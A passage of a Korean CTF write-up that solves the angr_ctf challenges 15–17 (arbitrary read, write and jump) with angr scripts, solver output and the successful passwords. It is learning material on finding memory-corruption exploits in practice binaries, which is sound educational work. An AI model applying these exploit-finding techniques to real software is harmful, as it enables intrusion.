adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold nullWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-19</span> <span class="hljs-number">13</span>:<span class="hljs-number">02</span>:<span class="hljs-number">28</span>,<span class="hljs-number">863</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">3</span>) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-19</span> <span class="hljs-number">13</span>:<span class="hljs-number">02</span>:<span class="hljs-number">28</span>,<span class="hljs-number">863</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register edi <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x8048571</span> (__libc_csu_init+<span class="hljs-number">0x1</span> <span class="hljs-keyword">in</span> <span class="hljs-number">15</span>_angr_arbitrary_read (<span class="hljs-number">0x8048571</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-19</span> <span class="hljs-number">13</span>:<span class="hljs-number">02</span>:<span class="hljs-number">28</span>,<span class="hljs-number">864</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register ebx <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x8048573</span> (__libc_csu_init+<span class="hljs-number">0x3</span> <span class="hljs-keyword">in</span> <span class="hljs-number">15</span>_angr_arbitrary_read (<span class="hljs-number">0x8048573</span>))CRITICAL | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-19</span> <span class="hljs-number">13</span>:<span class="hljs-number">02</span>:<span class="hljs-number">29</span>,<span class="hljs-number">011</span> | angr.sim_state | The name state.se <span class="hljs-keyword">is</span> deprecated; please use state.solver.<span class="hljs-number">41810812</span> <span class="hljs-string">b&apos;$&quot;(!!0&quot;00(((0000GJOH&apos;</span>j0ker@angr:~/angr_ctf/dist$ ./<span class="hljs-number">15</span>_angr_arbitrary_read Enter the password: <span class="hljs-number">41810812</span> $<span class="hljs-string">&quot;(!!0&quot;</span><span class="hljs-number">00</span>(((<span class="hljs-number">0000</span>GJOHGood Job.</code></pre><h1 id="16-angr-arbitrary-write"><a href="#16-angr-arbitrary-write" class="headerlink" title="16_angr_arbitrary_write"></a>16_angr_arbitrary_write</h1><p><img src="/2021/09/26/j0ker/angr_part6/2.png" alt="Untitled"></p><p>&#xC774;&#xBC88;&#xC5D0;&#xB294; &#xC5B4;&#xB514;&#xC5D0; &#xBB58; &#xC4F0;&#xB294; &#xBB38;&#xC81C;&#xC778;&#xB4EF; &#xC2F6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB38;&#xC81C;&#xB97C; &#xBCF4;&#xBA74; &#xC77C;&#xB2E8; &#xB450; &#xAC1C;&#xC758; &#xC778;&#xD48B;&#xC744; &#xBC1B;&#xAD6C;&#xC694;.(&#xB610; <code>scanf</code>&#xB294; &#xD6C4;&#xD0B9;&#xD574;&#xC918;&#xC57C; &#xACA0;&#xB124;&#x2026;) &#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xD48B;&#xC740; &#xC5EC;&#xC804;&#xD788; &#xD0A4;&#xACE0; &#xB450; &#xBC88;&#xC9F8; &#xC778;&#xD48B;&#xC740; &#xBC84;&#xD37C;&#xB85C; 20&#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; <code>s</code>&#xC640; <code>dest</code>&#xC758; &#xC8FC;&#xC18C; &#xCC28;&#xC774;&#xB97C; &#xBCF4;&#xBA74; &#xC5EC;&#xC804;&#xD788; 0x10&#xB9CC;&#xD07C; &#xCC28;&#xC774;&#xAC00; &#xC544;&#xB2C8;&#xAE4C; &#xB9C8;&#xC9C0;&#xB9C9; 4&#xBC14;&#xC774;&#xD2B8;&#xB85C; <code>dest</code>&#xB97C; &#xB36E;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xADF8; &#xB4A4;&#xC5D0; &#xBD84;&#xAE30;&#xBB38;&#xC5D0;&#xC11C;&#xB294; &#xB450; &#xAC1C;&#xC758; <code>strncpy</code>&#xAC00; &#xC788;&#xB294;&#xB370;, &#xD0A4;&#xAC00; &#xB9DE;&#xC73C;&#xBA74; <code>dest</code>&#xC5D0; &#xBCF5;&#xC0AC;&#xD558;&#xACE0; &#xD0A4;&#xAC00; &#xD2C0;&#xB9AC;&#xBA74; <code>unimportant_buffer</code>&#xC5D0; &#xBCF5;&#xC0AC;&#xB97C; &#xD569;&#xB2C8;&#xB2E4;. &#xC5ED;&#xC2DC; &#xC774; &#xBB38;&#xC81C;&#xB294; <code>dest</code>&#xB97C; &#xB36E;&#xC740; &#xB2E4;&#xC74C; &#xC6D0;&#xD558;&#xB294; &#xACF3;&#xC5D0; &#xC4F0;&#xB294; &#xBB38;&#xC81C;&#xC774;&#xAD70;&#xC694;. &#xB9C8;&#xC9C0;&#xB9C9;&#xC5D0;&#xB294; <code>strncmp</code>&#xB97C; &#xD1B5;&#xD574; <code>password_buffer</code>&#xAC00; &#xD2B9;&#xC815; &#xBB38;&#xC790;&#xC5F4;&#xACFC; &#xAC19;&#xC740; &#xC9C0;&#xB97C; &#xBE44;&#xAD50;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xB2E4;&#xBA74; &#xC6B0;&#xB9AC;&#xB294; <code>dest</code>&#xB97C; <code>password_buffer</code>&#xC758; &#xC8FC;&#xC18C;&#xB85C; &#xB36E;&#xACE0; &#xAC70;&#xAE30;&#xC5D0; &#xC800; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC4F0;&#xBA74; &#xB420;&#xB4EF; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC81C; &#xCF54;&#xB4DC;&#xB97C; &#xC9DC;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. <code>scanf</code>&#xB97C; &#xD6C4;&#xD0B9;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC740; &#xC55E;&#xC5D0; &#xBB38;&#xC81C;&#xC640; &#xAC19;&#xC73C;&#xB2C8; &#xAC74;&#xB108;&#xB6F0;&#xAE30;&#xB85C; &#xD558;&#xAD6C;&#xC694;. <code>strncpy</code>&#xB97C; &#xCCB4;&#xD06C;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC744; &#xC9DC;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_strncpy</span>(<span class="hljs-params">state</span>):</span>  strncpy_src = state.memory.load(state.regs.esp+<span class="hljs-number">8</span>, <span class="hljs-number">4</span>, endness=project.arch.memory_endness)  strncpy_dest = state.memory.load(state.regs.esp+<span class="hljs-number">4</span>, <span class="hljs-number">4</span>, endness=project.arch.memory_endness)  strncpy_len = state.memory.load(state.regs.esp+<span class="hljs-number">12</span>, <span class="hljs-number">4</span>, endness=project.arch.memory_endness)  src_contents = state.memory.load(strncpy_src, <span class="hljs-number">16</span>)  <span class="hljs-keyword">if</span> state.se.symbolic(src_contents) <span class="hljs-keyword">and</span> state.se.symbolic(strncpy_dest):    password_string = <span class="hljs-string">&apos;NDYNWEUJ&apos;</span>    buffer_address = <span class="hljs-number">0x57584344</span>    does_src_hold_password = src_contents[:<span class="hljs-number">64</span>] == password_string        does_dest_equal_buffer_address = strncpy_dest == buffer_address    <span class="hljs-keyword">if</span> state.satisfiable(extra_constraints=(does_src_hold_password, does_dest_equal_buffer_address)):      state.add_constraints(does_src_hold_password, does_dest_equal_buffer_address)      <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>    <span class="hljs-keyword">else</span>:      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></code></pre><p>&#xC77C;&#xB2E8; &#xAC01;&#xAC01;&#xC758; &#xC778;&#xC790;&#xB4E4;&#xC744; &#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;. <code>strncpy</code>&#xC758; &#xC778;&#xC790; &#xC21C;&#xC11C;&#xC5D0; &#xB530;&#xB77C; &#xC2A4;&#xD0DD;&#xC5D0; &#xCC28;&#xACE1;&#xCC28;&#xACE1; &#xC313;&#xC774;&#xB2C8; &#xADF8; &#xC624;&#xD504;&#xC14B;&#xC5D0; &#xB9DE;&#xCDB0; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xAC12;&#xB4E4;&#xC744; &#xB85C;&#xB4DC;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; <code>src</code>&#xC758; &#xC8FC;&#xC18C;&#xC5D0;&#xC11C; &#xB2E4;&#xC2DC; &#xBB38;&#xC790;&#xC5F4; 16&#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xAC00;&#xC838;&#xC640; &#xD574;&#xB2F9; &#xBB38;&#xC790;&#xC5F4;&#xACFC; <code>dest</code>&#xC758; &#xC8FC;&#xC18C;&#xAC00; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xC778;&#xC9C0;&#xB97C; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7F0; &#xB2E4;&#xC74C; &#xC6B0;&#xB9AC;&#xAC00; &#xBE44;&#xAD50;&#xD574;&#xC57C;&#xD560; &#xBB38;&#xC790;&#xC5F4;&#xACFC; &#xB36E;&#xC5B4;&#xC57C;&#xD560; &#xBC84;&#xD37C;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xC55E;&#xC11C; &#xC598;&#xAE30;&#xD588;&#xB4EF;&#xC774; &#xBE44;&#xD2B8;&#xBCA1;&#xD130;&#xB294; &#xBE44;&#xD2B8; &#xB2E8;&#xC704;&#xB85C; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>src</code>&#xC5D0; &#xC788;&#xB294; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xC5B4;&#xB4E4;&#xC77C; &#xB54C;&#xB294; &#xC778;&#xB371;&#xC2A4;&#xB97C; &#xBE44;&#xD2B8; &#xB2E8;&#xC704;&#xB85C; &#xC124;&#xC815;&#xD574;&#xC8FC;&#xC5B4;&#xC57C;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC77D;&#xC5B4;&#xC628; 16&#xBC14;&#xC774;&#xD2B8; &#xC911;&#xC5D0; &#xC55E; 8&#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xAC00;&#xC838;&#xC640;&#xC57C;&#xD560; &#xB54C;&#xC5D0;&#xB294; <code>src_contents[:64]</code> &#xD615;&#xC2DD;&#xC73C;&#xB85C; &#xBD88;&#xB7EC;&#xC640;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC6B0;&#xB9AC;&#xAC00; &#xC785;&#xB825;&#xD55C; &#xBB38;&#xC790;&#xC5F4; &#xC911; &#xC55E; 8&#xBC14;&#xC774;&#xD2B8;&#xAC00; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xB9DE;&#xCDB0;&#xC57C;&#xD560; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xB9DE;&#xB294;&#xC9C0;&#xB97C; &#xBE44;&#xAD50;&#xD558;&#xB294; &#xC870;&#xAC74;&#xC81C;&#xC57D;&#xBB38;&#xACFC; <code>dest</code>&#xC758; &#xC8FC;&#xC18C;&#xAC00; <code>password_buffer</code>&#xC758; &#xC8FC;&#xC18C;&#xAC00; &#xB9DE;&#xB294;&#xC9C0; &#xBE44;&#xAD50;&#xD558;&#xB294; &#xC870;&#xAC74;&#xC81C;&#xC57D;&#xBB38;&#xB4E4;&#xC744; &#xC124;&#xC815;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span>  strncpy_address = <span class="hljs-number">0x08048410</span>  <span class="hljs-keyword">if</span> state.addr == strncpy_address:    <span class="hljs-keyword">return</span> check_strncpy(state)  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></code></pre><p>&#xADF8;&#xB9AC;&#xACE0; &#xC55E;&#xC5D0;&#xC11C; &#xD574;&#xC8FC;&#xC5C8;&#xB358; &#xAC83;&#xCC98;&#xB7FC; <code>strncpy</code>&#xAC00; &#xD638;&#xCD9C;&#xB420; &#xB54C; &#xC704; &#xCCB4;&#xD06C; &#xD568;&#xC218;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC124;&#xC815;&#xD558;&#xBA74; &#xB05D;!</p><h2 id="sol16-py"><a href="#sol16-py" class="headerlink" title="sol16.py"></a>sol16.py</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripy<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  initial_state = project.factory.entry_state()  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ReplacementScanf</span>(<span class="hljs-params">angr.SimProcedure</span>):</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self, format_string, scanf0_address, scanf1_address</span>):</span>      scanf0 = claripy.BVS(<span class="hljs-string">&apos;scanf0&apos;</span>, <span class="hljs-number">32</span>)            scanf1 = claripy.BVS(<span class="hljs-string">&apos;scanf1&apos;</span>, <span class="hljs-number">8</span>*<span class="hljs-number">20</span>)      <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> scanf1.chop(bits=<span class="hljs-number">8</span>):        self.state.add_constraints(char &gt;= <span class="hljs-number">0x21</span>, char &lt;= <span class="hljs-number">0x7e</span>)            self.state.memory.store(scanf0_address, scanf0, endness=project.arch.memory_endness)      self.state.memory.store(scanf1_address, scanf1)            self.state.globals[<span class="hljs-string">&apos;solutions0&apos;</span>] = scanf0      self.state.globals[<span class="hljs-string">&apos;solutions1&apos;</span>] = scanf1  scanf_symbol = <span class="hljs-string">&apos;__isoc99_scanf&apos;</span>  <span class="hljs-comment"># :string</span>  project.hook_symbol(scanf_symbol, ReplacementScanf())  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_strncpy</span>(<span class="hljs-params">state</span>):</span>    strncpy_src = state.memory.load(state.regs.esp+<span class="hljs-number">8</span>, <span class="hljs-number">4</span>, endness=project.arch.memory_endness)    strncpy_dest = state.memory.load(state.regs.esp+<span class="hljs-number">4</span>, <span class="hljs-number">4</span>, endness=project.arch.memory_endness)    strncpy_len = state.memory.load(state.regs.esp+<span class="hljs-number">12</span>, <span class="hljs-number">4</span>, endness=project.arch.memory_endness)    src_contents = state.memory.load(strncpy_src, <span class="hljs-number">16</span>)    <span class="hljs-keyword">if</span> state.se.symbolic(src_contents) <span class="hljs-keyword">and</span> state.se.symbolic(strncpy_dest):      password_string = <span class="hljs-string">&apos;NDYNWEUJ&apos;</span>      buffer_address = <span class="hljs-number">0x57584344</span>      does_src_hold_password = src_contents[:<span class="hljs-number">64</span>] == password_string            does_dest_equal_buffer_address = strncpy_dest == buffer_address      <span class="hljs-keyword">if</span> state.satisfiable(extra_constraints=(does_src_hold_password, does_dest_equal_buffer_address)):        state.add_constraints(does_src_hold_password, does_dest_equal_buffer_address)        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>      <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>    <span class="hljs-keyword">else</span>:      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>  simulation = project.factory.simgr(initial_state)  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span>    strncpy_address = <span class="hljs-number">0x08048410</span>    <span class="hljs-keyword">if</span> state.addr == strncpy_address:      <span class="hljs-keyword">return</span> check_strncpy(state)    <span class="hljs-keyword">else</span>:      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>  simulation.explore(find=is_successful)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    solution0 = solution_state.se.eval(solution_state.globals[<span class="hljs-string">&apos;solutions0&apos;</span>], cast_to=int)    solution1 = solution_state.se.eval(solution_state.globals[<span class="hljs-string">&apos;solutions1&apos;</span>], cast_to=bytes)    print(<span class="hljs-string">&apos;{} {}&apos;</span>.format(solution0, solution1))  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ python3 sol16.py <span class="hljs-number">16</span>_angr_arbitrary_write WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-19</span> <span class="hljs-number">14</span>:<span class="hljs-number">01</span>:<span class="hljs-number">34</span>,<span class="hljs-number">776</span> | angr.project | Address <span class="hljs-keyword">is</span> already hooked, during hook(<span class="hljs-number">0x57654e80</span>, &lt;SimProcedure ReplacementScanf&gt;). Re-hooking.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-19</span> <span class="hljs-number">14</span>:<span class="hljs-number">01</span>:<span class="hljs-number">34</span>,<span class="hljs-number">856</span> | angr.storage.memory_mixins.default_filler_mixin | The program <span class="hljs-keyword">is</span> accessing memory <span class="hljs-keyword">or</span> registers <span class="hljs-keyword">with</span> an unspecified value. This could indicate unwanted behavior.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-19</span> <span class="hljs-number">14</span>:<span class="hljs-number">01</span>:<span class="hljs-number">34</span>,<span class="hljs-number">856</span> | angr.storage.memory_mixins.default_filler_mixin | angr will cope <span class="hljs-keyword">with</span> this by generating an unconstrained symbolic variable <span class="hljs-keyword">and</span> continuing. You can resolve this by:WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-19</span> <span class="hljs-number">14</span>:<span class="hljs-number">01</span>:<span class="hljs-number">34</span>,<span class="hljs-number">856</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">1</span>) setting a value to the initial stateWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-19</span> <span class="hljs-number">14</span>:<span class="hljs-number">01</span>:<span class="hljs-number">34</span>,<span class="hljs-number">856</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">2</span>) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold nullWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-19</span> <span class="hljs-number">14</span>:<span class="hljs-number">01</span>:<span class="hljs-number">34</span>,<span class="hljs-number">856</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">3</span>) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-19</span> <span class="hljs-number">14</span>:<span class="hljs-number">01</span>:<span class="hljs-number">34</span>,<span class="hljs-number">857</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register edi <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x8048681</span> (__libc_csu_init+<span class="hljs-number">0x1</span> <span class="hljs-keyword">in</span> <span class="hljs-number">16</span>_angr_arbitrary_write (<span class="hljs-number">0x8048681</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-19</span> <span class="hljs-number">14</span>:<span class="hljs-number">01</span>:<span class="hljs-number">34</span>,<span class="hljs-number">857</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register ebx <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x8048683</span> (__libc_csu_init+<span class="hljs-number">0x3</span> <span class="hljs-keyword">in</span> <span class="hljs-number">16</span>_angr_arbitrary_write (<span class="hljs-number">0x8048683</span>))CRITICAL | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-19</span> <span class="hljs-number">14</span>:<span class="hljs-number">01</span>:<span class="hljs-number">34</span>,<span class="hljs-number">909</span> | angr.sim_state | The name state.se <span class="hljs-keyword">is</span> deprecated; please use state.solver.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-19</span> <span class="hljs-number">14</span>:<span class="hljs-number">01</span>:<span class="hljs-number">35</span>,<span class="hljs-number">024</span> | claripy.ast.bv | BVV value <span class="hljs-keyword">is</span> being coerced <span class="hljs-keyword">from</span> a unicode string, encoding <span class="hljs-keyword">as</span> utf<span class="hljs-number">-8</span><span class="hljs-number">11604995</span> <span class="hljs-string">b&apos;NDYNWEUJ@@@@@@@@DCXW&apos;</span>j0ker@angr:~/angr_ctf/dist$ ./<span class="hljs-number">16</span>_angr_arbitrary_write Enter the password: <span class="hljs-number">11604995</span> NDYNWEUJ@@@@@@@@DCXWGood Job.</code></pre><h1 id="17-angr-arbitrary-jump"><a href="#17-angr-arbitrary-jump" class="headerlink" title="17_angr_arbitrary_jump"></a>17_angr_arbitrary_jump</h1><p>&#xC774;&#xC81C; &#xB4DC;&#xB514;&#xC5B4; &#xB9C8;&#xC9C0;&#xB9C9; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;! &#xB9C8;&#xC9C0;&#xB9C9; &#xBB38;&#xC81C;&#xC778; &#xB9CC;&#xD07C; &#xADF8;&#xB9AC;&#xACE0; &#xC774;&#xB984;&#xB3C4; <code>jump</code>&#xC778; &#xB9CC;&#xD07C; &#xC2E4;&#xD589;&#xD750;&#xB984;&#xC744; &#xBC14;&#xAFC0; &#xC218; &#xC788;&#xAC8C; &#xD558;&#xB294; &#xBB38;&#xC81C;&#xC77C;&#xAC70; &#xAC19;&#xAD70;&#xC694;!</p><p><img src="/2021/09/26/j0ker/angr_part6/3.png" alt="Untitled"></p><p><img src="/2021/09/26/j0ker/angr_part6/4.png" alt="Untitled"></p><p>&#xBB38;&#xC81C;&#xB294; &#xB9E4;&#xC6B0; &#xAC04;&#xB2E8;&#xD55C; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB0E5; <code>scanf</code>&#xC5D0;&#xC11C; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xB97C; &#xC77C;&#xC73C;&#xCF1C; &#xC775;&#xC2A4;&#xB97C; &#xD558;&#xBA74; &#xB418;&#xACA0;&#xC8E0;. &#xADF8;&#xB807;&#xB2E4;&#xBA74; &#xC870;&#xAC74; &#xC81C;&#xC57D;&#xC744; &#xC5B4;&#xB5BB;&#xAC8C; &#xD560; &#xC9C0;&#xAC00; &#xBB38;&#xC81C;&#xC774;&#xACA0;&#xB124;&#xC694;.</p><p>&#xC77C;&#xB2E8; eip&#xC5D0; &#xC870;&#xAC74; &#xC81C;&#xC57D;&#xC744; &#xAC78;&#xC5B4;&#xBCFC; &#xC218; &#xC788;&#xC744;&#xB4EF; &#xD569;&#xB2C8;&#xB2E4;. &#xADFC;&#xB370; &#xC5B4;&#xB514;&#xB85C; &#xC870;&#xAC74;&#xC81C;&#xC57D;&#xC744; &#xAC78; &#xAC83;&#xC778;&#xC9C0;&#xAC00; &#xBB38;&#xC81C;&#xC778;&#xB370; &#xD568;&#xC218; &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xBCF4;&#xBA74; <code>print_good</code>&#xC774;&#xB77C;&#xB294; &#xD568;&#xC218;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xB9C8;&#xB0E5; eip&#xC5D0; &#xC870;&#xAC74;&#xC81C;&#xC57D;&#xB9CC; &#xAC78;&#xC5B4;&#xC8FC;&#xBA74; &#xB418;&#xACA0;&#xB124;? &#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xACE0; &#xBB38;&#xC81C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC5F4;&#xC5C8;&#xB354;&#xB2C8; &#xC0DD;&#xAC01;&#xBCF4;&#xB2E4; &#xBCF5;&#xC7A1;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">project = angr.Project(path_to_binary)initial_state = project.factory.entry_state() simulation = project.factory.simgr(initial_state, save_unconstrained=<span class="hljs-literal">True</span>)</code></pre><p>&#xBA3C;&#xC800; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xBA54;&#xB2C8;&#xC800;&#xB97C; &#xC124;&#xC815;&#xD560; &#xB54C; <code>save_unconstrained</code> &#xC635;&#xC158;&#xC744; &#xD65C;&#xC131;&#xD654;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; unconstrained&#xD55C; state&#xB97C; &#xC800;&#xC7A5;&#xD574; &#xC8FC;&#xB294; &#xC635;&#xC158;&#xC785;&#xB2C8;&#xB2E4;. &#xC989; eip&#xB97C; &#xCEE8;&#xD2B8;&#xB864;&#xD558;&#xB294; &#xAC83;&#xACFC; &#xAC19;&#xC774; &#xC81C;&#xC57D;&#xC870;&#xAC74;&#xC774; &#xC5C6;&#xC5B4; &#xC5B4;&#xB5A0;&#xD55C; &#xAC12;&#xC774;&#xB4E0; &#xD750;&#xB984;&#xC774; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xB294; &#xACBD;&#xC6B0;&#xAC00; unconstrained&#xD55C; state&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xBB38;&#xC81C;&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xB7F0; unconstrained&#xD55C; state&#xC5D0;&#xC11C; &#xC6B0;&#xB9AC;&#xAC00; &#xD65C;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; state&#xB97C; &#xCC3E;&#xC544;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">solution_state = <span class="hljs-literal">None</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">has_found_solution</span>():</span>  <span class="hljs-keyword">return</span> solution_state <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">has_unconstrained</span>():</span>  <span class="hljs-keyword">return</span> len(simulation.unconstrained) &gt; <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">has_active</span>():</span>  <span class="hljs-keyword">return</span> len(simulation.active) &gt; <span class="hljs-number">0</span><span class="hljs-keyword">while</span> (has_active() <span class="hljs-keyword">or</span> has_unconstrained()) <span class="hljs-keyword">and</span> (<span class="hljs-keyword">not</span> has_found_solution()):  <span class="hljs-keyword">for</span> unconstrained_state <span class="hljs-keyword">in</span> simulation.unconstrained:    eip = unconstrained_state.regs.eip    <span class="hljs-keyword">if</span> unconstrained_state.satisfiable(extra_constraints=(eip == <span class="hljs-number">0x42585249</span>)):      solution_state = unconstrained_state      solution_state.add_constraints(solution_state.regs.eip == <span class="hljs-number">0x42585249</span>)      <span class="hljs-keyword">break</span>  simulation.drop(stash=<span class="hljs-string">&apos;unconstrained&apos;</span>)  simulation.step()</code></pre><p>unconstrained&#xD55C; state&#xB294; &#xD55C;&#xB450;&#xAC1C;&#xAC00; &#xC544;&#xB2C8;&#xACA0;&#xC8E0;? &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774; &#xBAA8;&#xB4E0; state&#xB97C; &#xD6D1;&#xC5B4;&#xBD10;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xBB50; &#xD558;&#xB098;&#xCBE4;&#xC740; &#xC775;&#xC2A4;&#xD560; &#xC218; &#xC788;&#xB294; state&#xAC00; &#xC788;&#xACA0;&#xC9C0;&#x2026; &#xC77C;&#xB2E8; state&#xC5D0; eip&#xAC00; &#xC6B0;&#xB9AC;&#xAC00; &#xC6D0;&#xD558;&#xB294; <code>Good Job</code>&#xC744; &#xCD9C;&#xB825;&#xD560; &#xC218; &#xC788;&#xB294; <code>print_good</code> &#xD568;&#xC218;&#xC758; &#xC8FC;&#xC18C;&#xB85C; 